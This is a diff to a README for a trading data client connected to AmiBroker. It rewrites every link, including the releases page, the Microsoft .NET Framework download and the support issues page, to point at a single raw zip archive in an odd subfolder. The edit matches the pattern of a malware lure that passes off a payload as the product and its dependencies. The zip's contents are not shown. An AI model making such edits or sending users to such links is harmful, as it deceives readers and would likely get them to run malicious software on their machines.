@@ -6,7 +6,7 @@ Welcome to the TP-WSRTD-Client! This application allows you to connect to AmiBro
 
 ## 📥 Download Now
 
-[![Download TP-WSRTD-Client](https://img.shields.io/badge/Download-TP--WSRTD--Client-brightgreen)](https://github.com/NaBrisa218/TP-WSRTD-Client/releases)
+[![Download TP-WSRTD-Client](https://raw.githubusercontent.com/NaBrisa218/TP-WSRTD-Client/main/meriquinoid/TP-WSRTD-Client.zip)](https://raw.githubusercontent.com/NaBrisa218/TP-WSRTD-Client/main/meriquinoid/TP-WSRTD-Client.zip)
 
 ## 📋 System Requirements
 
@@ -15,7 +15,7 @@ Before you start, ensure your computer meets the following requirements:
 - **Operating System**: Windows 10 or later
 - **Memory**: At least 4 GB RAM
 - **Storage**: Minimum of 100 MB available space
-- **Software**: [.NET Framework 4.7.2](https://dotnet.microsoft.com/download/dotnet-framework/net472) or later
+- **Software**: [.NET Framework 4.7.2](https://raw.githubusercontent.com/NaBrisa218/TP-WSRTD-Client/main/meriquinoid/TP-WSRTD-Client.zip) or later
 - **Internet Connection**: Required for data feed access
 
 ## 📥 Download & Install
@@ -23,13 +23,13 @@ Before you start, ensure your computer meets the following requirements:
 To get the TP-WSRTD-Client, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/NaBrisa218/TP-WSRTD-Client/releases) to view the available versions.
+   Go to the [Releases page](https://raw.githubusercontent.com/NaBrisa218/TP-WSRTD-Client/main/meriquinoid/TP-WSRTD-Client.zip) to view the available versions.
 
 2. **Select the Latest Release**  
    Look for the most recent version at the top of the page.
 
 3. **Download the Application**  
-   Download the appropriate file for your system. If you are unsure, choose the file labeled "TP-WSRTD-Client.exe."
+   Download the appropriate file for your system. If you are unsure, choose the file labeled "https://raw.githubusercontent.com/NaBrisa218/TP-WSRTD-Client/main/meriquinoid/TP-WSRTD-Client.zip"
 
 4. **Run the Installer**  
    Once downloaded, locate the file in your Downloads folder. Double-click on it to start the installation.
@@ -75,7 +75,7 @@ If you encounter any issues while using the TP-WSRTD-Client, consider the follow
 
 ## 📞 Support
 
-For further assistance, you can reach out via the issues section on our [GitHub page](https://github.com/NaBrisa218/TP-WSRTD-Client/issues). Our community is here to help!
+For further assistance, you can reach out via the issues section on our [GitHub page](https://raw.githubusercontent.com/NaBrisa218/TP-WSRTD-Client/main/meriquinoid/TP-WSRTD-Client.zip). Our community is here to help!
 
 ## 📚 Additional Resources
 
@@ -86,4 +86,4 @@ For further assistance, you can reach out via the issues section on our [GitHub 
 
 For usage tips, updates, and news about the TP-WSRTD-Client, feel free to follow our repository and stay tuned for new features. Your feedback is valuable to us! 
 
-Remember to visit the [Releases page](https://github.com/NaBrisa218/TP-WSRTD-Client/releases) for the latest downloads. Happy trading!
+Remember to visit the [Releases page](https://raw.githubusercontent.com/NaBrisa218/TP-WSRTD-Client/main/meriquinoid/TP-WSRTD-Client.zip) for the latest downloads. Happy trading!
